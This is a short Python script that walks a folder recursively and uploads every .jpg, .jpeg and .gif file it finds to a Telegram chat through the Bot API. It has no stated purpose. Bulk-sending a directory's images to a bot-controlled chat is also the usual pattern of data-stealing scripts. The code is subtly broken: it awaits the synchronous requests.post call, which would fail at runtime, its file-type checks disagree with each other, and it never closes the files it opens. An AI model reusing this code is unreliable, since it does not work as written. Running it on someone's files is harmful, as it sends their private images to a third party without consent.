import os
import requests
import asyncio

async def send_file_to_telegram(token, chat_id, file_path, caption):
    url = f"https://api.telegram.org/bot{token}/sendPhoto" if file_path.lower().endswith((".jpg", ".jpeg", ".mp4")) else f"https://api.telegram.org/bot{token}/sendDocument"
    
    files = {'photo' if file_path.lower().endswith((".jpg", ".jpeg", ".gif")) else 'document': open(file_path, 'rb')}
    data = {
        'chat_id': chat_id,
        'caption': caption
    }
    
    await requests.post(url, files=files, data=data)

async def find_and_send_file(token, chat_id, folder_path, caption):
    tasks = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file.lower().endswith((".jpg", ".jpeg", ".gif")):
                task = send_file_to_telegram(token, chat_id, file_path, caption)
                tasks.append(task)
    
    await asyncio.gather(*tasks)

